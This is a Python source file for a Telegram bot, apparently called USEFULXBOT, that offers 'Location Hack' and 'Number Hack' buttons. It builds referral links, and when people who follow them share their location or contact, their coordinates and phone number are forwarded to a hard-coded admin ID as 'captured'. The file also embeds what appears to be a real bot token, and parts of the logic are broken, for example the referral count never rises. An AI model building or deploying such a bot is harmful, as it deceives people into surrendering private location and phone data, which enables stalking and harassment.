import telebot
from telebot import types

BOT_TOKEN = '7405631437:AAGz6S5JJsZSECM9-Q6L7h4OG5gv0Z1vocs'
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_ID = 7401896933  # Admin ID for notifications
CHANNEL_ID = -1002316557460  # Private Channel Chat ID for Force Join

# User referral system data
referrals = {}
user_data = {}

# Bot Username
BOT_USERNAME = "USEFULXBOT"  # Replace with your bot's username

# Start command
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    referrer = None

    if len(message.text.split()) > 1:
        referrer = message.text.split()[1]

    if referrer and referrer != str(user_id):
        if referrer not in referrals:
            referrals[referrer] = []
        if user_id not in referrals[referrer]:
            referrals[referrer].append(user_id)
            # Notify the referrer
            bot.send_message(referrer, f"🎉 You have a new referral! User ID: {user_id}")

    # Check if user has joined the channel
    if not is_user_in_channel(message.chat.id):
        force_join_channel(message)
    else:
        # Store user data for the first time
        if user_id not in user_data:
            user_data[user_id] = {
                "referrals": 0,
                "location": None,
                "number": None,
                "profile_link": f"t.me/{BOT_USERNAME}?start={user_id}"
            }

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row('📍 Location Hack', '☎️ Number Hack')

        bot.send_message(
            message.chat.id,
            "Welcome to USEFULXBOT!\nChoose an option below:",
            reply_markup=markup
        )

# Check if user has joined the channel
def is_user_in_channel(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_ID, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Force Join Channel
def force_join_channel(message):
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("🔗 Join Channel", url="https://t.me/+g-i8Vohdrv44NDRl")
    markup.add(join_button)
    
    bot.send_message(
        message.chat.id,
        "You must join our channel to proceed.\nClick the button below to join:",
        reply_markup=markup
    )

# Button Handler
@bot.message_handler(func=lambda message: True)
def button_handler(message):
    if message.text == '📍 Location Hack':
        if user_data[message.from_user.id]["referrals"] >= 1:
            send_force_join_link(message, "Location")
        else:
            bot.send_message(
                message.chat.id, 
                "You need at least 1 referral to access location hack!"
            )
    elif message.text == '☎️ Number Hack':
        send_force_join_link(message, "Number")
    elif message.location:
        send_location_to_admin(message)
    elif message.contact:
        send_number_to_admin(message)
    else:
        bot.reply_to(message, "Please use the provided buttons.")

# Send Force Join Link for Location/Number Hack
def send_force_join_link(message, hack_type):
    user_id = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("🔗 Join Channel", url="https://t.me/+g-i8Vohdrv44NDRl")
    hack_button = None

    if hack_type == "Location":
        hack_button = types.InlineKeyboardButton("🔗 Hack Location", url=f"https://t.me/{BOT_USERNAME}?start=l_{user_id}")
    elif hack_type == "Number":
        hack_button = types.InlineKeyboardButton("🔗 Hack Number", url=f"https://t.me/{BOT_USERNAME}?start={user_id}")

    markup.add(join_button)
    markup.add(hack_button)

    bot.send_message(
        message.chat.id,
        f"To continue with {hack_type} hack, please join our channel first and then use the link below:",
        reply_markup=markup
    )

# Receive Location
def send_location_to_admin(message):
    latitude = message.location.latitude
    longitude = message.location.longitude
    user_id = message.from_user.id

    location_link = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"

    bot.send_message(
        ADMIN_ID,
        f"📍 New Location Captured:\nUser ID: {user_id}\nLatitude: {latitude}\nLongitude: {longitude}\n[View on Map]({location_link})",
        parse_mode='Markdown'
    )
    bot.send_message(
        message.chat.id,
        "✅ Location successfully captured and verified!"
    )

    user_data[user_id]["location"] = {"latitude": latitude, "longitude": longitude}

# Receive Phone Number
def send_number_to_admin(message):
    phone_number = message.contact.phone_number
    user_id = message.from_user.id

    bot.send_message(
        ADMIN_ID,
        f"☎️ New Phone Number Captured:\nUser ID: {user_id}\nPhone: {phone_number}",
        parse_mode='Markdown'
    )
    bot.send_message(
        message.chat.id,
        "✅ Phone number successfully captured and verified!"
    )

    user_data[user_id]["number"] = phone_number

# Admin Panel Command
@bot.message_handler(commands=['adminpanel'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "You are not authorized to view this panel.")
        return

    # Display new users and their data
    new_users = "\n".join([f"User ID: {user_id}, Referrals: {len(referrals.get(str(user_id), []))}, Location: {data['location']}, Number: {data['number']}, Profile: {data['profile_link']}" for user_id, data in user_data.items()])
    
    bot.send_message(ADMIN_ID, f"**Admin Panel**\nNew Users:\n{new_users if new_users else 'No users yet.'}")

# Bot Polling
bot.infinity_polling()
